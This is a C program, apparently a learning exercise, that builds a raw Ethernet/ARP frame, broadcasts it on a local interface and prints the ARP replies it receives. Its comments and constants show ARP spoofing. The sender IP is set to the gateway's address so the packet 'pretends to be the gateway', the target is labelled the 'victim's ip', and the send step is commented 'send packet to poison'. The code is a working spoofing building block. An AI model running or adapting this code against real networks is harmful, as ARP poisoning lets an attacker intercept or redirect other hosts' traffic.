/*****************************************************************
 * @File: Do not edit
 * @Author: LinusZhao
 * @Date: 2019-10-24 15:38:10
 * @LastEditors: LinusZhao
 * @LastEditTime: 2019-10-24 21:31:39
 * @Description: 实现一个arp广播包的发送 & arp的响应
 *****************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <netpacket/packet.h>
#include <net/if.h>
#include "iot_log.h"
 
// const items
const char INTERFACE[] = "ens33";
const uint8_t TargetMac[] = {0xff,0xff,0xff,0xff,0xff,0xff}; //broadcast's mac
const uint8_t SourceMac[] = {0x00,0x0c,0x29,0x01,0x67,0xcb}; //ubuntu's mac  00:0c:29:01:67:cb
const uint8_t TargetIp[] = {192,168,56,103};                 //victim's ip
#define TARGET_IP       "192.168.56.103"
const uint8_t SourceIp[] = {192,168,56,100};                 //gateway's ip, 这里很重要，因为我们要假装是网关，所以用网关的ip
 
// main function
int main(int argc, char **argv) 
{
    int arp_fd;
    uint8_t frame[42];        //total length of ethernet head plus arp packet is 42 octets
    uint8_t recvbuf[100];
    uint8_t	controlbuf[100];
    
    // create socket -- 创建socket(套接字)
    arp_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if(arp_fd < 0) {
        LOG_ERR("socket() failed");
        exit(1);
    }
    LOG_DEBUG("* Socket created.");
 
    
    // create arp frame -- 构建arp帧，其实就是将以太网头部和arp包组合，存入frame[]，前14字节为以太网头，后28字节为arp包
    // 这里使用了2个预先定义好的struct，很方便，不需要我们自己纯手工构建arp帧了
    struct ether_header eth_head;
    struct ether_arp eth_arp;
 
    memcpy(eth_head.ether_dhost, TargetMac, ETHER_ADDR_LEN);
    memcpy(eth_head.ether_shost, SourceMac, ETHER_ADDR_LEN);
    eth_head.ether_type = htons(ETHERTYPE_ARP);
 
    eth_arp.arp_hrd = htons(ARPHRD_ETHER);
    eth_arp.arp_pro = htons(ETHERTYPE_IP);
    eth_arp.arp_hln = ETHER_ADDR_LEN;
    eth_arp.arp_pln = 4;
    eth_arp.arp_op = htons(ARPOP_REQUEST); // request or reply
    memcpy(eth_arp.arp_sha, SourceMac, ETHER_ADDR_LEN);
    memcpy(eth_arp.arp_spa, SourceIp, 4);
    memcpy(eth_arp.arp_tha, TargetMac, ETHER_ADDR_LEN);
    memcpy(eth_arp.arp_tpa, TargetIp, 4);
 
    // 组包复制到frame数组
    memcpy(frame, &eth_head, sizeof(eth_head));
    memcpy(frame + sizeof(eth_head), &eth_arp, sizeof(eth_arp));
    LOG_DEBUG("* ARP frame created");
 
 
    // make sockaddr_ll ready for sendto() function -- 用作sendto()函数中的参数，此处主要是指定一个网络接口
    struct sockaddr_ll destaddr;
    destaddr.sll_family = AF_PACKET;
    if((destaddr.sll_ifindex = if_nametoindex(INTERFACE)) == 0) {
        LOG_ERR("if_nametoindex() failed");
        exit(1);
    }
    destaddr.sll_halen = htons(ETHER_ADDR_LEN);
    LOG_DEBUG("* struct sockaddr_ll destaddr ready.");
 
 
    // send packet to poison -- 将我们之前伪造好的arp响应包发送出去
    if(sendto(arp_fd, frame, sizeof(frame), 0, (struct sockaddr *)&destaddr, sizeof(destaddr)) == -1) {
        LOG_ERR("sendto() failed");
        exit(1);
    }
    LOG_DEBUG("* Packet sent.");
 
    // close socket -- 完成后关闭socket
    close(arp_fd);
    LOG_DEBUG("* Socket closed.");

    // 监听arp reply
    int rev_arp_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if(rev_arp_fd < 0) {
        LOG_ERR("socket rev_arp_fd failed");
        exit(1);
    }
    LOG_DEBUG("* Socket rev_arp_fd created.");
    
    struct sockaddr_in serve_addr;
    bzero(&serve_addr,sizeof(serve_addr));
    serve_addr.sin_family = AF_INET;
    // serve_addr.sin_addr.s_addr = htonl();
    if(inet_pton(AF_INET, TARGET_IP, &serve_addr.sin_addr) <= 0){
        LOG_ERR("inet_pton error");
        exit(1);
    }
    serve_addr.sin_port = htons(8888); // IP层端口可以随意填写
    if ( bind(rev_arp_fd,(struct sockaddr *)&serve_addr, sizeof(serve_addr)) < 0){
        LOG_ERR("bind error");
        // exit(1);
    }
    struct msghdr arp_reply_msg;
    struct iovec	iov;
    iov.iov_base = recvbuf;
	iov.iov_len = sizeof(recvbuf);
    
    arp_reply_msg.msg_name = (struct sockaddr *)&destaddr;
    arp_reply_msg.msg_iov = &iov;
    arp_reply_msg.msg_iovlen = 1; // 为啥是 1 ？
    arp_reply_msg.msg_control = controlbuf;
    while(1){
		arp_reply_msg.msg_namelen = sizeof(destaddr);
		arp_reply_msg.msg_controllen = sizeof(controlbuf);
		int n = recvmsg(rev_arp_fd, &arp_reply_msg, 0);
		if (n < 0) {
			if (errno == EINTR)
				continue;
			else
				LOG_ERR("recvmsg error");
		}
        LOG_DEBUG("arp_reply_msg:%d\n",n);
        struct ether_header *eth_head_p = (struct ether_header *)recvbuf;
        struct ether_arp *eth_arp_p = (struct ether_arp *)(recvbuf + sizeof(struct ether_header));
        
        int i = 0;
        if(eth_arp_p->arp_op == htons(ARPOP_REPLY) ){
            for (i = 0; i < ETHER_ADDR_LEN; i++){
                printf("%x ",eth_arp_p->arp_sha[i]);
            }
            printf("\r\n");
            for (i = 0; i < 4; i++){
                printf("%d.",eth_arp_p->arp_spa[i]);
            }
            printf("\r\n"); 
        }
 
	}
 
    return 0;
}